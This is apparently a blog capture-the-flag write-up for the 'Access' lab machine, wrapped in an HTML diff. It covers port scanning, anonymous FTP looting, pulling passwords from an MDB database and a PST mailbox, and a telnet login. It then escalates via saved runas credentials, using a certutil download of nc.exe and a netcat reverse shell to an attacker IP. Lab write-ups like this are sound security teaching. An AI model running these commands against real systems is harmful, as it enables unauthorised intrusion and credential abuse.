@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/access.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/access.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/access.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="access">Access</h1>
+
+<h1 id="skills">Skills</h1>
+
+<ul>
+  <li>Inspecting MDB files with <strong>mdb-tools</strong></li>
+  <li>Inspecting PDB files with <strong>readpst</strong></li>
+  <li>Enumertaing Stored credentials</li>
+</ul>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Only three ports are reported in the first scan</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Sat Sep 23 09:58:49 2023 as: nmap -p- -n -Pn --min-rate 5000 -oG 10.10.10.98_all_ports -vvv 10.10.10.98</span>
+<span class="c"># Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)</span>
+Host: 10.10.10.98 <span class="o">()</span>    Status: Up
+Host: 10.10.10.98 <span class="o">()</span>    Ports: 21/open/tcp//ftp///, 23/open/tcp//telnet///, 80/open/tcp//http///        Ignored State: filtered <span class="o">(</span>65532<span class="o">)</span>
+<span class="c"># Nmap done at Sat Sep 23 09:59:15 2023 -- 1 IP address (1 host up) scanned in 26.40 seconds</span>
+</code></pre></div></div>
+
+<p>We will perform a deeper enumeration</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Sat Sep 23 10:00:06 2023 as: nmap -p21,23,80 -n -Pn -sCV -oN 10.10.10.98_enum 10.10.10.98</span>
+Nmap scan report <span class="k">for </span>10.10.10.98
+Host is up <span class="o">(</span>0.054s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_Can<span class="s1">'t get directory listing: PASV failed: 425 Cannot open data connection.
+23/tcp open  telnet?
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Sep 23 10:03:04 2023 -- 1 IP address (1 host up) scanned in 178.57 seconds
+</span></code></pre></div></div>
+
+<h2 id="http-80">HTTP 80</h2>
+
+<p>Enumeration in the web server didn’t report anything at a first glance.</p>
+
+<ul>
+  <li>Directory and file fuzzing didn’t show anything</li>
+  <li>No subdomains</li>
+  <li>Only the image of a computer with a title <strong>LON-MC</strong></li>
+</ul>
+
+<h2 id="telnet-23">TELNET 23</h2>
+
+<ul>
+  <li>If we try to connect with a user we are prompted to use a password, but we don’ have any.</li>
+</ul>
+
+<h2 id="port-21">PORT 21</h2>
+
+<p>Port 21 allow for a remote login via anonymous user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.10.98                     
+Connected to 10.10.10.98.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.98:kali<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password: 
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt;
+</code></pre></div></div>
+
+<p>There are two directories and one file in each directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+08-23-18  09:16PM       &lt;DIR&gt;          Backups
+08-24-18  10:00PM       &lt;DIR&gt;          Engineer
+226 Transfer complete.
+ftp&gt; <span class="nb">dir </span>Backups
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+08-23-18  09:16PM              5652480 backup.mdb
+226 Transfer complete.
+ftp&gt; <span class="nb">dir </span>Engineer
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+08-24-18  01:16AM                10870 Access Control.zip
+226 Transfer complete.
+ftp&gt;
+</code></pre></div></div>
+
+<p>We will transefer those to our machine and see what we can do with them. However, since they are binary files we must enable binary transfer first in FTP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">type </span>binary
+200 Type <span class="nb">set </span>to I.
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">cd </span>Backups
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; get backup.mdb
+<span class="nb">local</span>: backup.mdb remote: backup.mdb
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+ 27% |<span class="k">***************************************************</span>                                                                                                                                           |  1526 KiB    1.48 MiB/s    00:02 ETAftp: Reading from network: Interrupted system call
+  0% |                                                                                                                                                                                              |    <span class="nt">-1</span>        0.00 KiB/s    <span class="nt">--</span>:-- ETA
+550 The specified network name is no longer available. 
+WARNING! 667 bare linefeeds received <span class="k">in </span>ASCII mode.
+File may not have transferred correctly.
+ftp&gt; <span class="nb">cd</span> ..
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; <span class="nb">cd </span>Engineer
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; get Access<span class="se">\ </span>Control.zip
+<span class="nb">local</span>: Access Control.zip remote: Access Control.zip
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+100% |<span class="k">**********************************************************************************************************************************************************************************************</span>| 10870       70.41 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 45 bare linefeeds received <span class="k">in </span>ASCII mode.
+File may not have transferred correctly.
+10870 bytes received <span class="k">in </span>00:00 <span class="o">(</span>70.34 KiB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>We end up with a <strong>mdb</strong> file and and <strong>zip</strong> file. Zip file needs a password so we proceed with the MDB file. Searching information about MDB files we discover that is a database file and with mdb-tools we can inspect the content. First we check all the tables with the word user in it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mdb-tables <span class="nt">--single-column</span> backup.mdb | <span class="nb">grep </span>user
+auth_user
+auth_user_groups
+auth_user_user_permissions
+userinfo_attarea
+</code></pre></div></div>
+
+<p>Then we query those to see if there is something interesting.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mdb-json backup.mdb  auth_user       
+<span class="o">{</span><span class="s2">"id"</span>:25,<span class="s2">"username"</span>:<span class="s2">"admin"</span>,<span class="s2">"password"</span>:<span class="s2">"admin"</span>,<span class="s2">"Status"</span>:1,<span class="s2">"last_login"</span>:<span class="s2">"08/23/18 21:11:47"</span>,<span class="s2">"RoleID"</span>:26<span class="o">}</span>
+<span class="o">{</span><span class="s2">"id"</span>:27,<span class="s2">"username"</span>:<span class="s2">"engineer"</span>,<span class="s2">"password"</span>:<span class="s2">"access4u@security"</span>,<span class="s2">"Status"</span>:1,<span class="s2">"last_login"</span>:<span class="s2">"08/23/18 21:13:36"</span>,<span class="s2">"RoleID"</span>:26<span class="o">}</span>
+<span class="o">{</span><span class="s2">"id"</span>:28,<span class="s2">"username"</span>:<span class="s2">"backup_admin"</span>,<span class="s2">"password"</span>:<span class="s2">"admin"</span>,<span class="s2">"Status"</span>:1,<span class="s2">"last_login"</span>:<span class="s2">"08/23/18 21:14:02"</span>,<span class="s2">"RoleID"</span>:26<span class="o">}</span>
+</code></pre></div></div>
+
+<p>We have some password here. We can try them in the ZIP file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x Access<span class="se">\ </span>Control.zip
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>C.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,4 CPUs AMD Ryzen 7 5800H with Radeon Graphics          <span class="o">(</span>A50F00<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 10870 bytes <span class="o">(</span>11 KiB<span class="o">)</span>
+
+Extracting archive: Access Control.zip
+<span class="nt">--</span>
+Path <span class="o">=</span> Access Control.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 10870
+
+    
+Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
+Everything is Ok         
+
+Size:       271360
+Compressed: 10870
+</code></pre></div></div>
+
+<p>We now have a <strong>pst</strong> file which can be read using tools like <strong>readpst</strong>. This kind of files are part of outlook and normally have information about emails.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/access]
+└─<span class="nv">$ </span>readpst Access<span class="se">\ </span>Control.pst 
+Opening PST file and indexes...
+Processing Folder <span class="s2">"Deleted Items"</span>
+        <span class="s2">"Access Control"</span> - 2 items <span class="k">done</span>, 0 items skipped.
+</code></pre></div></div>
+
+<p>This tool will dump the whole email message where we can see a user and a password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The password <span class="k">for </span>the &amp;#8220<span class="p">;</span>security&amp;#8221<span class="p">;</span> account has been changed to <span class="k">**</span>4Cc3ssC0ntr0ller<span class="k">**</span>.&amp;nbsp<span class="p">;</span> 
+Please ensure this is passed on to your engineers.&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p <span class="nv">class</span><span class="o">=</span>MsoNormal&gt;&lt;o:p&gt;&amp;nbsp<span class="p">;</span>&lt;/o:p&gt;&lt;/p&gt;&lt;p <span class="nv">class</span><span class="o">=</span>MsoNormal&gt;Regards,&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p <span class="nv">class</span><span class="o">=</span>MsoNormal&gt;
+John&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<p>We recall that telnet port request a password to connect. We can user our new credentials (<strong>security</strong>:<strong>4Cc3ssC0ntr0ller)</strong> to connect.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/access]
+└─<span class="nv">$ </span>telnet <span class="nt">--user</span><span class="o">=</span>security 10.10.10.98
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+Welcome to Microsoft Telnet Service 
+
+password: 
+
+<span class="k">*</span><span class="o">===============================================================</span>
+Microsoft Telnet Server.
+<span class="k">*</span><span class="o">===============================================================</span>
+C:<span class="se">\U</span>sers<span class="se">\s</span>ecurity&gt;whoami
+access<span class="se">\s</span>ecurity
+</code></pre></div></div>
+
+<p>We have a foothold on the machine.</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>We will perform some basic enumeration. First we check our privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\s</span>ecurity&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State   
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">========</span>
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working     Disabled
+</code></pre></div></div>
+
+<p>We now start with our basic enumeration checking files in directories, open ports, users, groups and so on. Until we check which stored credentials we have on the Credential Manager.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive<span class="o">=</span>ACCESS<span class="se">\A</span>dministrator
+                                                       Type: Domain Password
+    User: ACCESS<span class="se">\A</span>dministrator
+</code></pre></div></div>
+
+<p>This means that we could run any command as ACCESS\Administrator. In order to leverage this we will use <strong>runas</strong> built-in tool that we have on windows, which is a powerless version of sudo command in linux. We can use this command two ways:</p>
+
+<ul>
+  <li>Via stored credential in the Credential Manager (our way)</li>
+  <li>Via credentials we have obtain somehow</li>
+</ul>
+
+<p>Since runas command doesn’t show the output we will send a reverse shell using netcat. First we have to transfer <strong>nc.exe</strong> binary to the machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.17/nc.exe nc.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<p>Now is trivial to send the reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;runas /env /noprofile /savecred /user:ACCESS<span class="se">\a</span>dministrator <span class="s2">"nc.exe 10.10.14.17 4444 -e cmd.exe"</span>
+</code></pre></div></div>
+
+<p>We have admin access to the machine and we can read the flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/secnotes]
+└─<span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 4444      
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.98] 49159
+Microsoft Windows <span class="o">[</span>Version 6.1.7600]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;whoami
+<span class="nb">whoami
+</span>access<span class="se">\a</span>dministrator
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
